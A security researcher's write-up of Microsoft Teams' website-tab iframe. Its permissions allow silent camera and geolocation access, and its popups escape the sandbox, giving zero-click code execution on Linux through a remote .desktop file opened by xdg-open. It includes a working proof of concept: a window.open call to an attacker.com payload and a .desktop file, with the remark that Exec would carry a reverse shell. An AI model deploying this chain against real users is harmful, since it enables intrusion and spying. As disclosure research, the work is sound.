---
title: "Linux Microsoft Teams RCE Feature"
date: 2021-10-05
---

![](/assets/ms-teams/teams-penguins.jpg)

This article covers a security research on Microsoft Teams focused on abusing legitimate features to achieve unauthorized access to browser APIs, sandbox escapes, and Remote Code Execution on Linux. The findings were reported to Microsoft, who classified them as "by design functionality."

## The Iframe

Microsoft Teams allows users to embed external websites as tabs inside channels. The iframe responsible for loading these websites has a set of security misconfigurations worth examining:

```html
<iframe
  sandbox="allow-forms allow-modals allow-popups allow-popups-to-escape-sandbox
           allow-pointer-lock allow-scripts allow-same-origin allow-downloads"
  allow="geolocation *; microphone *; camera *; midi *; encrypted-media *"
  src="//website.com">
</iframe>
```

Two attributes stand out:

- **`allow`**, which grants the iframe access to geolocation, microphone, camera, midi, and encrypted media
- **`sandbox`**, which includes `allow-popups-to-escape-sandbox`, allowing popups to break out of the iframe's sandbox

### Abusing the allow attribute

The `allow` attribute defines a Permissions Policy for the iframe, controlling which browser APIs the embedded content can access.

The issue: when a site inside the iframe requests access to the camera or microphone, the browser permission prompt shows **teams.microsoft.com** as the origin, not the embedded site. Since most users have already granted Teams access to these devices (for calls), the embedded site gains access **without any additional user interaction**.

![](/assets/ms-teams/allow-attribute-poc.png)

### Camera and Geolocation PoC

By exploiting the `allow` attribute, a malicious site embedded inside Teams can silently access the user's camera feed and retrieve their geolocation coordinates (latitude and longitude), all without any permission prompt.

![](/assets/ms-teams/camera-poc.png)

PoC source code available in [this gist](https://gist.github.com/viniciuspereiras/52f0db22f4b2bf89dcf5ef63394e21a2).

### Escaping the sandbox

The `allow-popups-to-escape-sandbox` value enables `window.open()` to create popups **outside** the iframe's sandbox. These popups open within the Teams (Electron) context, which means they can trigger URI scheme handlers and launch external applications like `calculator://`, `mailto://`, `ms-word://`, etc.

DOM manipulation from the iframe is restricted, which limits the attack surface. But the ability to trigger arbitrary URI schemes opens up a different path.

## URI scheme exploration

The obvious first attempt: `file://`. Blocked in Electron. Same for `smb://` (which could be used for NTLM hash theft or SMB relay). Both are explicitly disabled.

After further research, [this article by Positive Security](https://positive.security/blog/url-open-rce) provided several useful techniques for abusing URI scheme handlers in Electron applications.

## RCE on Linux

On Linux, `xdg-open` handles URI schemes by default. When `window.open()` points to a remote `.desktop` file, `xdg-open` downloads and **executes it**, running whatever command is specified in the `Exec` field.

This means: if a user opens a Teams channel tab containing a malicious iframe, arbitrary code executes on their machine with **zero clicks**. This worked on most major Linux distributions.

![](/assets/ms-teams/rce-calc-poc.png)

The embedded website only needs:

```html
<script>
window.open('https://attacker.com/payload.desktop')
</script>
```

And the `.desktop` file:

```ini
[Desktop Entry]
Version=1.0
Type=Application
Name=RCE
Exec=gnome-calculator
Terminal=false
StartupNotify=false
```

In a real scenario, `Exec` would contain a reverse shell or any other malicious command.

## Windows

The `xdg-open` trick doesn't apply to Windows, and no path to 0-click RCE was found on the Windows client.

However, the URI scheme abuse still enables:

- **1-click RCE** via Click-Once applications using `microsoft-edge://`
- **RCE through third-party protocol handlers**, for example vulnerabilities in Steam's protocol handler, WinSCP, or even CVE-2021-40444 in Microsoft Word could be chained with this iframe escape

## Microsoft's response

Microsoft closed the report as "by design":

> In this case this would be by design functionality. The users are allowed to load external content in that location as a feature. The inability to access the DOM limits the actions of the attacker. We do note, that the window could be clearer in stating that it is external content, and we have forwarded this information over to the product's functional team for review for future versions. For now we are closing this case out as this is currently how this function is intended to work.

## References

- [Positive Security: URL Open RCE](https://positive.security/blog/url-open-rce)
- [0x00sec: Using URI to Pop Shells via Discord](https://0x00sec.org/t/using-uri-to-pop-shells-via-the-discord-client/11673)
- [IANA URI Schemes Registry](https://www.iana.org/assignments/uri-schemes/uri-schemes.xhtml)
- [oskarsve/ms-teams-rce](https://github.com/oskarsve/ms-teams-rce)
- [Microsoft: Publishing ClickOnce Applications](https://docs.microsoft.com/visualstudio/deployment/publishing-clickonce-applications)
